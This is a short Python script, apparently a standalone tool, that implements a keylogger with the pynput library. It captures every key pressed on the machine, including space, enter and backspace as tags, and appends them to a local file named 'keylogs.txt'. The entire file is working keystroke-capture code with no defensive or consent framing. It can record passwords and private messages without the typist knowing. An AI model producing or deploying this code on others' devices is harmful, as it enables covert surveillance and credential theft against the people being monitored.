from pynput.keyboard import Key, Listener

# File to log keystrokes
log_file = "keylogs.txt"

# Function to write the key pressed to the file
def log_keystroke(key):
    try:
        with open(log_file, "a") as file:
            # Handle special keys separately
            if isinstance(key, Key):
                if key == Key.space:
                    file.write(' [SPACE] ')
                elif key == Key.enter:
                    file.write('\n[ENTER]\n')
                elif key == Key.backspace:
                    file.write(' [BACKSPACE] ')
                else:
                    file.write(f' [{key}] ')
            else:
                file.write(str(key).replace("'", ""))  # Remove single quotes from characters
    except Exception as e:
        print(f"Error: {e}")

# Function that starts listening for keystrokes
def start_keylogger():
    with Listener(on_press=log_keystroke) as listener:
        listener.join()

if __name__ == "__main__":
    start_keylogger()
